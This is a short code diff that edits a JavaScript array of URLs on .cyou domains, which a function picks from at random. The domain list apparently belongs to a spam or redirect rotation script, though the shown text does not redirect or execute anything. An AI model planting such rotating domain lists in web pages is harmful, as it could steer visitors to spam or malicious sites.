@@ -1,6 +1,7 @@
 var ars 	= rChoice([
-	'http://insurance.bestproducts.cyou/',
-	'http://bestcar.gamestop.cyou/'
+	'https://bestproducts.cyou/',
+	'https://animegirl.cyou/',
+	'https://gamestop.cyou/'
 	]);
 
 function rChoice(arr) {
